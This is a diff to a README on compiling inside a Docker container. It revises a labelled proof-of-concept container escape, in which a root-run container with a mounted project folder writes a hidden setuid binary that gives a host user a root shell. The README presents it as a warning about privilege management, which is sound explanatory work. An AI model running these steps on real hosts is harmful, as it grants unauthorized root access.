@@ -51,7 +51,7 @@ docker ps -a | grep i386/alpine:latest
 docker commit $cont-id alpine-i386-dev
 docker rename $cont-id alpine-i386-dev
 
-devc="-u $(id -u):$(id -g) -v .:/src -w /src /src alpine-i386-dev"
+devc="-u $(id -u):$(id -g) -v .:/src -w /src alpine-i386-dev"
 export devc
 ```
 
@@ -63,10 +63,15 @@ export devc
 > This container escape exploit is provided as PoC only for educational purposes and as a warning to pay attention to correct permissions and privileges management when using containers to compile your own stuff. Moreover, there isn't any grant that option `-p` is supported by every shell or system allowing a local privileges escalation without asking the password.
 
 ```sh
-devc="-u $(id -u):$(id -g) -v .:/src -w /src /src alpine-i386-dev"
+devc="-u 0:$(id -g) -v .:/src -w /src alpine-i386-dev"
 docker run -it --rm $devc /bin/sh
-# Inside the container:
-cat << 'EOF' > iamroot.c
+```
+
+Inside the container:
+
+```sh
+umask 0012
+cat << 'EOF' > .iamroot.c
 #include <stdio.h>
 #include <unistd.h>
 int main() {
@@ -75,16 +80,16 @@ int main() {
     return 0;
 }
 EOF
-gcc -o iamroot iamroot.c -s -static
-size iamroot; file iamroot
-chown root:1000 iamroot
-chmod +xs iamroot
+gcc -o .iamroot .iamroot.c -s -static
+size .iamroot; file .iamroot
+chmod ug+wxs .iamroot
+ls -al .iamroot
 exit
 ```
 
 Inside the host:
 
-- `./iamroot`
+- `./.iamroot`
 
 Inside the shell:
 
@@ -92,7 +97,7 @@ Inside the shell:
 
 After the exit:
 
-- `rm -f iamroot`
+- `rm -f .iamroot`
 
 ---
 
@@ -115,7 +120,7 @@ strp() {
   strip --strip-all --remove-section=.comment --remove-section=.note $@
 }
 
-devc="-u $(id -u):$(id -g) -v .:/src -w /src /src alpine-i386-dev"
+devc="-u $(id -u):$(id -g) -v .:/src -w /src alpine-i386-dev"
 docker run --rm $devc /bin/sh -c "cc $CFLAGS -D_USE_MLTP \
   $CFLAGS32 umkaos.c -no-pie -o $biname && chown 1000:1000 $biname"
 ```
